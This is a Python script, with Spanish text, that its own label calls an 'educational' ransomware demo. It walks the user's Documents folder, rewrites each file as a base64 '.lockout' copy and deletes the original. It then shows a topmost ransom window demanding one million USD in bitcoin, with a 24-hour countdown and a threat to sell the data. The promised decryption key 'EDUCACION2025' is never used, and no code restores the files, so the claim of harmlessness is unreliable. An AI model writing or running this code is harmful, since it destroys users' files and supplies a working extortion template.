import os
import base64
import time
from tkinter import Tk, Label, Button, Canvas, font, Text
import threading

CARPETA_ORIGINAL = os.path.expanduser("~/Documents")

def simular_cifrado_carpeta():
    if not os.path.exists(CARPETA_ORIGINAL):
        print(f"Error: La carpeta '{CARPETA_ORIGINAL}' no existe.")
        return
    for root, _, files in os.walk(CARPETA_ORIGINAL):
        for archivo in files:
            ruta_original = os.path.join(root, archivo)
            ruta_cifrada = f"{ruta_original}.lockout"
            if os.path.isfile(ruta_original):
                try:
                    with open(ruta_original, "rb") as f:
                        contenido = base64.b64encode(f.read()).decode()
                    with open(ruta_cifrada, "w") as f:
                        f.write(contenido)
                    os.remove(ruta_original)
                except Exception as e:
                    print(f"Error procesando {archivo}: {e}")
    print("Archivos cifrados con extensión .lockout.")

def update_timer(label, hours):
    total_seconds = hours * 3600
    while total_seconds >= 0:
        hrs, mins = divmod(total_seconds, 3600)
        mins, secs = divmod(mins, 60)
        label.config(text=f'{hrs:02d}:{mins:02d}:{secs:02d}')
        time.sleep(1)
        total_seconds -= 1

def mostrar_ventana_rescate():
    root = Tk()
    root.title("¡Tus datos están en nuestras manos!")
    root.geometry("700x800")
    root.attributes("-topmost", True)
    root.configure(bg="#1a1a1a")

    custom_font = font.Font(family="Georgia", size=12, weight="bold")
    custom_font1 = font.Font(family="Georgia", size=9, weight="bold")
    title_font = font.Font(family="Georgia", size=22, weight="bold")

    canvas = Canvas(root, width=700, height=300, bg="#1a1a1a", highlightthickness=0)
    canvas.pack(pady=20)

    rect_x1, rect_y1, rect_width, rect_height = 150, 50, 450, 200
    canvas.create_rectangle(rect_x1, rect_y1, rect_x1 + rect_width, rect_y1 + rect_height, 
                            outline="#000000", fill="#0d0d0d", width=3)

    circle_radius = 30
    circle_center_x = rect_x1 + (rect_width // 2)
    canvas.create_oval(circle_center_x - circle_radius, rect_y1 - circle_radius,
                       circle_center_x + circle_radius, rect_y1 + circle_radius,
                       outline="#000000", fill="#0d0d0d", width=3)
    canvas.create_text(circle_center_x, rect_y1, text="☠️", font=("Segoe UI Emoji", 30), fill="#545454")

    text_x = rect_x1 + (rect_width // 2)
    text_y1 = rect_y1 + circle_radius * 2 + 20
    canvas.create_text(text_x, text_y1, text="¡TUS DATOS ESTÁN EN NUESTRAS MANOS!", 
                       font=title_font, fill="#dc4d4e", justify="center", width=380)

    instruction_text = Text(root, bg="#0d0d0d", fg="#8c8c8c", font=custom_font1, height=2, width=50, bd=0)
    instruction_text.place(x=text_x - 225, y=text_y1 + 70)
    instruction_text.insert("1.0", "Para ver los archivos que hemos bloqueado, haz clic ")
    instruction_text.insert("end", "AQUÍ", "link")
    instruction_text.insert("end", ".")
    instruction_text.tag_configure("link", foreground="#dc4d4e", underline=True)
    instruction_text.config(state="disabled")
    instruction_text.tag_bind("link", "<Button-1>", lambda e: os.startfile(CARPETA_ORIGINAL))

    text_widget = Text(root, bg="#1a1a1a", fg="#8c8c8c", font=custom_font, width=70, height=6, bd=0)
    text_widget.pack(pady=20)
    text_widget.tag_configure("white_text", foreground="white")
    text_widget.tag_configure("underline", underline=True)
    text_widget.tag_configure("center", justify="center")
    text_widget.insert("1.0", "Si quieres volver a tener acceso a ellos es muy fácil, \nsolo tienes que depositar ", "center")
    text_widget.insert("end", "1.000.000 USD en bitcoins ", ("white_text", "center"))
    text_widget.insert("end", "\ndurante las próximas 24 horas en esta dirección:\n", "center")
    text_widget.insert("end", "\n13sdfDFjsd3flFHh456fLHKgJ239dsla", ("white_text", "underline", "center"))
    text_widget.tag_add("center", "1.0", "end")
    text_widget.config(state="disabled")

    timer_label = Label(root, text="24:00:00", font=custom_font, bg="#1a1a1a", fg="#ff0000")
    timer_label.pack(pady=20)

    Label(root, text="⚠️ Si no lo haces, los subastaremos en la dark web ⚠️", 
          font=custom_font, bg="#1a1a1a", fg="#dc4d4e").pack(pady=20)

    Label(root, text="Esto es una demo educativa. Usa la clave 'EDUCACION2025' para descifrar.", 
          font=("Arial", 8), bg="#1a1a1a", fg="#ffffff").pack(side="bottom", pady=10)

    Button(root, text="Cerrar", command=root.destroy, bg="#8c8c8c", fg="#ffffff").pack(pady=20)

    threading.Thread(target=update_timer, args=(timer_label, 24), daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    simular_cifrado_carpeta()
    mostrar_ventana_rescate()
